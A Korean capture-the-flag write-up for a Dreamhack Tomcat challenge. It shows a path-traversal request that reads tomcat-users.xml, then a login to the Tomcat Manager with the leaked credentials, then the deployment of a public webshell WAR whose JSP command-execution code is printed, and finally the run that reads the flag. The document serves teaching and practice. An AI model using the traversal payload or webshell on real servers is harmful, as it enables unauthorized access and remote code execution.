# B2 · Tomcat Manager

### 1. VM에 접속한다

문제 페이지에서 이미지 파일을 불러오는 `image.jsp?file=...` 요청을 확인한다. `file` 파라미터로 파일 경로를 전달하는 구조이므로 다른 경로도 지정할 수 있는지 살펴본다.

### 2. 요청 분석 — Path Traversal로 관리자 설정 파일 접근

**① `file` 파라미터에 상위 디렉터리 이동 경로를 입력한다.**

**`image.jsp`의 실제 서버 소스코드는 확보하지 못했으므로 내부 구현 코드를 단정할 수 없다.** 아래는 Burp Repeater에서 사용한 HTTP 요청이다.

```http
GET /image.jsp?file=/../../../../../../usr/local/tomcat/conf/tomcat-users.xml HTTP/1.1
Host: host3.dreamhack.games:12275
```

`../`는 상위 디렉터리로 이동하는 경로 표현이다. `file` 값에 이를 반복해 넣고 Tomcat 설정 파일인 `/usr/local/tomcat/conf/tomcat-users.xml`을 요청했다.

해당 설정 파일의 내용이 응답에 노출되었다면 `file`에 지정한 경로가 의도된 디렉터리 밖의 파일 접근에 사용되는 **Path Traversal**이 성립한다. 이는 요청·응답 동작으로 판단한 것으로, 구현이 `FileInputStream`을 사용했는지는 확인되지 않았다.

**② `tomcat-users.xml`에서 관리 권한을 확인한다.**

```xml
<role rolename="manager-gui"/>
<role rolename="manager-script"/>
<role rolename="admin-gui"/>

<user username="tomcat" password="[SECRET]"
      roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
```

`tomcat` 계정에 `manager-gui` 등 관리 권한이 부여되어 있다.

### 3. Tomcat Manager 로그인 — `/manager/html`은 어떻게 알았을까?

`tomcat-users.xml`의 `manager-gui` 권한을 보고 **Tomcat의 기본 관리 애플리케이션(Manager)**을 이용하는 계정임을 알 수 있다.

Tomcat 공식 문서에서 웹 관리 화면은 `/manager/html` 경로를 사용한다. 즉, 이 주소는 파일 내용에서 직접 발견한 것이 아니라 **Tomcat의 표준 관리 경로를 확인한 것**이다.

```text
http://서버주소:포트/manager/html
```

앞에서 확인한 `tomcat` 계정으로 로그인하니 **Tomcat Web Application Manager** 화면에 접속할 수 있었다.

이 화면에는 실행 중인 애플리케이션 목록과 **WAR file to deploy** 기능이 있다. WAR를 올려 새 JSP 애플리케이션을 배포할 수 있다.

### 4. WAR 파일 업로드와 JSP 웹 셸 분석

처음 직접 만든 WAR는 JSP의 Java 버전 호환성 문제로 `500` 오류가 발생했다. 이후 GitHub에 있는 [webshell.war](https://github.com/tghosth/webshelljar/blob/master/webshell.war)를 사용했다.

WAR는 Java 웹 애플리케이션을 담은 **ZIP 기반 배포 파일**이다. 실제 사용한 `webshell.war`의 구조는 다음과 같다.

```text
webshell.war
├── META-INF/
│   └── MANIFEST.MF
└── index.jsp
```

**`index.jsp`의 핵심 코드**

```jsp
String cmd = request.getParameter("cmd");
String output = "";

if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd, null, null);
    BufferedReader sI = new BufferedReader(
        new InputStreamReader(p.getInputStream())
    );

    String s;
    while ((s = sI.readLine()) != null) {
        output += s + "</br>";
    }
}
```

- `request.getParameter("cmd")`: URL의 `cmd` 파라미터를 읽는다.
- `Runtime.getRuntime().exec(cmd, null, null)`: 입력받은 명령어를 서버에서 실행한다.
- `p.getInputStream()`: 실행 결과의 **표준 출력(stdout)**을 읽는다.
- `output`: 읽은 내용을 HTML에 출력한다.

따라서 WAR를 배포하면 서버에서 명령어를 실행하고 결과를 볼 수 있다. **Tomcat Manager의 WAR 배포 권한을 통한 RCE**인 것이다.

Tomcat Manager의 **WAR file to deploy**에 `webshell.war`를 업로드하고 `Deploy`를 누른다. WAR 파일 이름이 `webshell.war`이므로 기본 배포 경로는 `/webshell`이 된다.

### 5. 웹 셸에서 FLAG 확인

배포된 웹 셸로 접속한다.

```text
http://서버주소:포트/webshell/index.jsp
```

명령어 입력창에 `/flag`를 입력하거나 다음과 같이 요청한다.

```http
GET /webshell/index.jsp?cmd=%2Fflag HTTP/1.1
Host: host3.dreamhack.games:14594
```

`%2F`는 `/`를 URL 인코딩한 것이므로 `cmd` 값은 `/flag`이다.

웹 셸이 `/flag`를 **명령어로 실행**하고, 프로그램이 출력한 `DH{...}`를 `getInputStream()`으로 읽어 화면에 보여준다.

```text
/flag 실행 → stdout에 FLAG 출력 → JSP가 읽어서 브라우저에 표시
```

> **취약점 원인:** `image.jsp?file=` 요청의 Path Traversal로 `tomcat-users.xml`에 접근할 수 있었고, 유출된 관리자 계정으로 Tomcat Manager에 로그인한 뒤 WAR 배포 기능을 이용해 서버에서 코드를 실행할 수 있었다.

**참고 자료:** [Tomcat Manager 공식 문서](https://tomcat.apache.org/tomcat-8.5-doc/html-manager-howto.html) · [사용한 WAR 파일 GitHub](https://github.com/tghosth/webshelljar)
